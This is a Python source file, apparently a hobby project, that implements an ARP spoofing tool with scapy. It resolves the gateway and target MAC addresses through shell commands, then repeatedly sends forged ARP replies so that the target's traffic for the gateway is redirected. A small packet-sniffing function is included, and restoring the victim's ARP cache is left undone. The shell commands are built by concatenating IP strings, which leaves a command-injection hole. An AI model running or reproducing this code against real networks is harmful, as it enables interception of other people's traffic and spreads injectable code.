import scapy.all as scapy
from cSubprocess import *
import time 

def sniff_packets():
    packets = scapy.sniff(filter='tcp', count=10)
    print(packets.show)

class ArpSpoofer:
    default_gateway_ip = None

    def __init__(self):
        pass

    def ping_address(self, ip_address):
        command = 'ping -c 1 ' + ip_address
        clean_subprocess(command, -1)

    def get_mac_address(self, ip_address):
        self.ping_address(ip_address)
        command = 'arp -a | grep ' + ip_address + ' | cut -d " " -f 4'
        target_mac = clean_subprocess(command, 0)
        return target_mac

    def get_default_gateway_ip(self):
        command = "netstat -rn | awk '/^0.0.0.0/ {print $2}'"
        self.default_gateway_ip = clean_subprocess(command, 0)
        return self.default_gateway_ip

    def rm_address_arp_cache(self, ip_address):
        command = 'arp -d ' + ip_address
        clean_subprocess(command, -1)
    def spoof(self, gateway_ip, target_ip):
        try:
            while True:
                target_mac = self.get_mac_address(target_ip)
                gateway_mac = self.get_mac_address(gateway_ip)

                ether_1 = scapy.Ether(dst=target_mac)
                # ether_2 = scapy.Ether(dst=gateway_mac)

                arp_packet_1 = scapy.ARP(op = 2, psrc=gateway_ip, pdst=target_ip , hwdst=target_mac)
                # arp_packet_2 = scapy.ARP(op = 2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)

                # Combine the Ethernet frame with the ARP packet
                packet_1 = ether_1 / arp_packet_1
                # packet_2 = ether_2 / arp_packet_2

                # Send the packet
                print(packet_1.show())
                # print(packet_2.show())

                scapy.send(packet_1)
                # scapy.send(packet_2)

                time.sleep(2)
        except KeyboardInterrupt:
            print(" exiting arpspoof...")
            # TODO: Implement Restoring Their Arp Cache